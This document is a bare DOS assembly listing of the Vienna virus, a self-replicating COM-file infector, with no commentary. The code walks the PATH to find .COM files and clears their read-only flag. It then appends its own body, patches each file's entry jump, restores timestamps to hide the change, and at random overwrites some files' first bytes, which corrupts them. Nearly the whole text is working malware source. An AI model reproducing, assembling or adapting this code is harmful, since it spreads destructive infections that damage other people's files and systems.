

	PAGE	,132
S00000	SEGMENT BYTE PUBLIC 'code'
	ASSUME	CS:S00000
	ASSUME	SS:S00000
	ASSUME	DS:S00000
H00000	DB	44 DUP(?)
H0002C	DB	212 DUP(?)
P00100	PROC	FAR
	ASSUME	ES:S00000
H00100:
	JMP	H0011F
	DW	0109H
	DW	21CDH
	DB	0CDH
	DB	' THE VIRUS IS VIENNA!?$'
H0011F:
	PUSH	CX
	MOV	DX,0318H
	CLD
	MOV	SI,DX
	ADD	SI,000AH
	MOV	DI,0100H
	MOV	CX,0003H
	REPZ	MOVSB
	MOV	SI,DX
	MOV	AH,30H
	INT	21H
	CMP	AL,00H
	JNE	H0013F
	JMP	H00306
H0013F:
	PUSH	ES
	MOV	AH,2FH
	INT	21H
	MOV	[SI+0000H],BX
	MOV	[SI+0002H],ES
	POP	ES
	ASSUME	ES:NOTHING
	MOV	DX,005FH
	NOP
	ADD	DX,SI
	MOV	AH,1AH
	INT	21H
	PUSH	ES
	PUSH	SI
	MOV	ES,H0002C
	MOV	DI,0000H
H00160:
	POP	SI
	PUSH	SI
	ADD	SI,001AH
	LODSB
	MOV	CX,8000H
	REPNZ	SCASB
	MOV	CX,0004H
H0016F:
	LODSB
	SCASB
	JNE	H00160
	LOOP	H0016F
	POP	SI
	POP	ES
	MOV	[SI+0016H],DI
	MOV	DI,SI
	ADD	DI,001FH
	MOV	BX,SI
	ADD	SI,001FH
	MOV	DI,SI
	JMP	SHORT H001C5
H0018B:
	CMP	WORD PTR [SI+0016H],00H
	JNE	H00195
	JMP	H002F8
H00195:
	PUSH	DS
	PUSH	SI
	MOV	DS,ES:[002CH]
	ASSUME	DS:NOTHING
	MOV	DI,SI
	MOV	SI,ES:[DI+0016H]
	ADD	DI,001FH
H001A7:
	LODSB
	CMP	AL,3BH
	JE	H001B6
	CMP	AL,00H
	JE	H001B3
	STOSB
	JMP	H001A7
H001B3:
	MOV	SI,0000H
H001B6:
	POP	BX
	POP	DS
	MOV	[BX+0016H],SI
	CMP	BYTE PTR [DI-01H],5CH
	JE	H001C5
	MOV	AL,5CH
	STOSB
H001C5:
	MOV	[BX+0018H],DI
	MOV	SI,BX
	ADD	SI,0010H
	MOV	CX,0006H
	REPZ	MOVSB
	MOV	SI,BX
	MOV	AH,4EH
	MOV	DX,001FH
	NOP
	ADD	DX,SI
	MOV	CX,0003H
	INT	21H
	JMP	SHORT H001E9
H001E5:
	MOV	AH,4FH
	INT	21H
H001E9:
	JNC	H001ED
	JMP	H0018B
H001ED:
	MOV	AX,[SI+0075H]
	AND	AL,1FH
	CMP	AL,1FH
	JE	H001E5
	CMP	WORD PTR [SI+0079H],0FA00H
	JNBE	H001E5
	CMP	WORD PTR [SI+0079H],0AH
	JC	H001E5
	MOV	DI,[SI+0018H]
	PUSH	SI
	ADD	SI,007DH
H0020F:
	LODSB
	STOSB
	CMP	AL,00H
	JNE	H0020F
	POP	SI
	MOV	AX,4300H
	MOV	DX,001FH
	NOP
	ADD	DX,SI
	INT	21H
	MOV	[SI+0008H],CX
	MOV	AX,4301H
	AND	CX,0FFFEH
	MOV	DX,001FH
	NOP
	ADD	DX,SI
	INT	21H
	MOV	AX,3D02H
	MOV	DX,001FH
	NOP
	ADD	DX,SI
	INT	21H
	JNC	H00244
	JMP	H002E9
H00244:
	MOV	BX,AX
	MOV	AX,5700H
	INT	21H
	MOV	[SI+0004H],CX
	MOV	[SI+0006H],DX
	MOV	AH,2CH
	INT	21H
	AND	DH,07H
	JNE	H0026C
	MOV	AH,40H
	MOV	CX,0005H
	MOV	DX,SI
	ADD	DX,008AH
	INT	21H
	JMP	SHORT H002D0
	DB	90H
H0026C:
	MOV	AH,3FH
	MOV	CX,0003H
	MOV	DX,000AH
	NOP
	ADD	DX,SI
	INT	21H
	JC	H002D0
	CMP	AX,0003H
	JNE	H002D0
	MOV	AX,4202H
	MOV	CX,0000H
	MOV	DX,0000H
	INT	21H
	JC	H002D0
	MOV	CX,AX
	SUB	AX,0003H
	MOV	[SI+000EH],AX
	ADD	CX,02F9H
	MOV	DI,SI
	SUB	DI,01F7H
	MOV	[DI],CX
	MOV	AH,40H
	MOV	CX,0288H
	MOV	DX,SI
	SUB	DX,01F9H
	INT	21H
	JC	H002D0
	CMP	AX,0288H
	JNE	H002D0
	MOV	AX,4200H
	MOV	CX,0000H
	MOV	DX,0000H
	INT	21H
	JC	H002D0
	MOV	AH,40H
	MOV	CX,0003H
	MOV	DX,SI
	ADD	DX,000DH
	INT	21H
H002D0:
	MOV	DX,[SI+0006H]
	MOV	CX,[SI+0004H]
	AND	CX,0FFE0H
	OR	CX,001FH
	MOV	AX,5701H
	INT	21H
	MOV	AH,3EH
	INT	21H
H002E9:
	MOV	AX,4301H
	MOV	CX,[SI+0008H]
	MOV	DX,001FH
	NOP
	ADD	DX,SI
	INT	21H
H002F8:
	PUSH	DS
	MOV	AH,1AH
	MOV	DX,[SI+0000H]
	MOV	DS,[SI+0002H]
	INT	21H
	POP	DS
H00306:
	POP	CX
	XOR	AX,AX
	XOR	BX,BX
	XOR	DX,DX
	XOR	SI,SI
	MOV	DI,0100H
	PUSH	DI
	XOR	DI,DI
	RET	FFFFH
P00100	ENDP
	DW	0080H
	DW	18E0H
	DB	'"v]'
	DW	2013H
	DW	0B400H
	DW	0BA09H
	DW	1CE9H
	DB	0
	DB	'*.COM'
	DW	2800H
	DW	3700H
	DB	3
	DB	'PATH=A.COM'
	DW	4F00H
	DW	004DH
	DB	'MAPMEM.COM'
	DB	0
	DB	'COM'
	DB	0
	DB	'                         '
	DB	'               '
	DB	1
	DB	'????????COM'
	DW	0103H
	DB	7 DUP(?)
	DB	' "v]'
	DW	1F13H
	DB	3 DUP(?)
	DB	'A.COM'
	DW	2000H
	DB	' '
	DB	5 DUP(?)
	DW	0F0EAH
	DW	00FFH
	DB	0F0H
S00000	ENDS
	END	P00100

